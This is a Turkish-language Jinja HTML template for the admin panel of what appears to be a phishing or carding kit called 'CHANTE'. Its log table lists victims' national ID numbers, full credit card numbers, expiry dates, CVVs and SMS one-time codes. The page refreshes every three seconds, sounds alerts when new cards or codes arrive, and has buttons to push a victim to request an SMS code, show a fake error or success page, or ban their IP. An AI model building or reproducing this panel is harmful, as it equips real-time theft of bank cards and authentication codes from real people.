{% extends "admin/layout.html" %}
{% block title %}Log Tablosu - CHANTE ADMIN SYSTEM{% endblock %}
{% block head_scripts %}
  <style>
    /* Buton stilleri */
    .btn-group-vertical .btn {
      width: 100%;
      text-align: left;
      white-space: nowrap;
      min-width: 140px;
      transition: all 0.3s ease;
      border-radius: 4px !important;
    }
    .btn-group-vertical .btn:hover {
      transform: translateX(3px);
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    }
    .btn-group-vertical .btn i {
      width: 20px;
      text-align: center;
    }
    .action-buttons-cell {
      min-width: 160px;
    }
    .btn-sm {
      font-size: 0.8rem;
      padding: 0.375rem 0.75rem;
    }
    
    /* Tablo stilleri */
    .table thead th {
      font-weight: 600;
      font-size: 0.85rem;
      letter-spacing: 0.5px;
      border-bottom: 2px solid rgba(255,255,255,0.2) !important;
    }
    .table tbody tr {
      transition: background-color 0.2s ease;
    }
    .table tbody tr:hover {
      background-color: rgba(0,123,255,0.05);
    }
    
    /* Badge stilleri */
    .badge {
      font-weight: 500;
      padding: 0.35em 0.65em;
      margin: 2px;
    }
    
    /* Online/Offline indicator */
    .fa-signal {
      font-size: 0.8rem;
      margin-left: 5px;
    }
    
    /* Kart animasyonu */
    .card {
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      // Tooltip'leri aktif et
      var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
      var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
        return new bootstrap.Tooltip(tooltipTriggerEl);
      });
      
      // Tablo otomatik yenileme
      setInterval(function() {
        if (globalThis.jQuery) {
          const baseUrl = globalThis.location.href.split('?')[0] + ' #tablo';
          globalThis.jQuery('#tablo').load(baseUrl, function() {
            // Yenileme sonrası tooltip'leri tekrar aktif et
            var newTooltips = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            newTooltips.map(function (el) {
              return new bootstrap.Tooltip(el);
            });
          });
        }
      }, 3000);
    });
  </script>
{% endblock %}
{% block content %}
  <div class="page-header">
    <h1 class="page-title"><i class="fa-solid fa-table-list me-2"></i>Log Tablosu</h1>
    <div>
      <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="{{ url_for('admin.dashboard') }}">Anasayfa</a></li>
        <li class="breadcrumb-item active" aria-current="page">Log Tablosu</li>
      </ol>
    </div>
  </div>
  {% if card_sound %}
    <audio autoplay>
      <source src="{{ url_for('admin.static', filename='chante1.mp3') }}" type="audio/mpeg">
    </audio>
  {% endif %}
  {% if sms_sound %}
    <audio autoplay>
      <source src="{{ url_for('admin.static', filename='chante2.mp3') }}" type="audio/mpeg">
    </audio>
  {% endif %}
  <div class="row">
    <div class="col-xl-12">
      <div class="card">
        <div class="card-header bg-light">
          <h3 class="card-title mb-0">
            <i class="fa-solid fa-users me-2"></i>Aktif Kullanıcı Logları
            <span class="badge bg-primary ms-2">{{ logs|length }}</span>
          </h3>
          <small class="text-muted"><i class="fa-solid fa-rotate me-1"></i>Tablo otomatik olarak 3 saniyede bir güncellenir</small>
        </div>
        <div class="card-body">
          <div id="tablo" class="table-responsive">
            <table class="table border text-nowrap text-md-nowrap table-borderless mb-0">
              <thead class="bg-primary text-white">
                <tr>
                  <th class="text-nowrap"><i class="fa-solid fa-circle-info me-1"></i>DURUM</th>
                  <th><i class="fa-solid fa-id-card me-1"></i>TC KİMLİK NO</th>
                  <th><i class="fa-solid fa-credit-card me-1"></i>KREDİ KARTI</th>
                  <th><i class="fa-solid fa-calendar me-1"></i>SKT</th>
                  <th><i class="fa-solid fa-hashtag me-1"></i>CVV</th>
                  <th><i class="fa-solid fa-comment-sms me-1"></i>SMS</th>
                  <th class="text-nowrap"><i class="fa-solid fa-money-bill-wave me-1"></i>TOPLAM LİMİT</th>
                  <th class="text-nowrap"><i class="fa-solid fa-money-bill me-1"></i>GÜNCEL LİMİT</th>
                  <th class="text-nowrap"><i class="fa-solid fa-globe me-1"></i>IP ADRESİ</th>
                  <th class="text-nowrap"><i class="fa-solid fa-clock me-1"></i>TARİH</th>
                  <th class="text-nowrap"><i class="fa-solid fa-cog me-1"></i>İŞLEM</th>
                </tr>
              </thead>
              <tbody>
                {% for log in logs %}
                  <tr>
                    <td>
                      <span class="badge rounded-pill bg-danger">#{{ log.id }}</span>
                      <span class="badge rounded-pill bg-secondary">{{ log.now }}</span>
                      <span class="badge rounded-pill bg-primary">{{ log.banka or 'Banka Bilinmiyor' }}</span><br>
                      <span class="badge rounded-pill bg-info">{{ log.cihaz }}</span>
                      <span class="badge rounded-pill bg-warning">{{ log.tarayici }}</span>
                    </td>
                    <td>{{ log.tc }}</td>
                    <td>{{ log.kk }}</td>
                    <td>{{ log.sonkul }}</td>
                    <td>{{ log.cvv }}</td>
                    <td>{{ log.sms }}</td>
                    <td>{{ log.toplam_limit or 0 }} TL</td>
                    <td>{{ log.guncel_limit or log.kartlimit or 0 }} TL</td>
                    <td>
                      {{ log.ip }}
                      {% if log.lastOnline and log.lastOnline > current_ts %}
                        <i class="fa-solid fa-signal text-success"></i>
                      {% else %}
                        <i class="fa-solid fa-signal text-danger"></i>
                      {% endif %}
                    </td>
                    <td>{{ log.date }}</td>
                    <td class="action-buttons-cell">
                      <div class="btn-group-vertical" role="group">
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="back">
                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-warning mb-1" title="Kullanıcıyı geri gönder" data-bs-toggle="tooltip" type="submit">
                            <i class="fa-solid fa-arrow-rotate-left me-1"></i>Geri Gönder
                          </button>
                        </form>
                        
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="sms">
                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-info mb-1" title="SMS kodu iste" data-bs-toggle="tooltip" type="submit">
                            <i class="fa-solid fa-comment-sms me-1"></i>SMS İste
                          </button>
                        </form>
                        
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="tebrik">
                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-success mb-1" title="Tebrik sayfasına yönlendir" data-bs-toggle="tooltip" type="submit">
                            <i class="fa-solid fa-circle-check me-1"></i>Tebrik
                          </button>
                        </form>
                        
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="hata1">
                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-secondary mb-1" title="Hatalı giriş mesajı göster" data-bs-toggle="tooltip" type="submit">
                            <i class="fa-solid fa-comment-slash me-1"></i>Hata Göster
                          </button>
                        </form>
                      </div>
                      
                      <div class="btn-group-vertical mt-2" role="group">
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="ban">
                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-danger mb-1" title="IP adresini kalıcı olarak yasakla" data-bs-toggle="tooltip" type="submit" onclick="return confirm('{{ log.ip }} IP adresini yasaklamak istediğinize emin misiniz?')">
                            <i class="fa-solid fa-ban me-1"></i>Banla
                          </button>
                        </form>
                        
                        <form method="post" class="d-inline">
                          <input type="hidden" name="action" value="delete">
                          <input type="hidden" name="log_id" value="{{ log.id }}">
                          <button class="btn btn-sm btn-outline-danger mb-1" title="Bu log kaydını sil" data-bs-toggle="tooltip" type="submit" onclick="return confirm('Bu log kaydını silmek istediğinize emin misiniz?')">
                            <i class="fa-solid fa-trash me-1"></i>Sil
                          </button>
                        </form>
                      </div>
                    </td>
                  </tr>
                {% else %}
                  <tr>
                    <td colspan="11" class="text-center py-5">
                      <i class="fa-solid fa-inbox fa-3x text-muted mb-3 d-block"></i>
                      <h5 class="text-muted">Henüz log kaydı alınmadı</h5>
                      <p class="text-muted">Kullanıcı aktivitesi olduğunda burada görüntülenecektir.</p>
                    </td>
                  </tr>
                {% endfor %}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  </div>
{% endblock %}
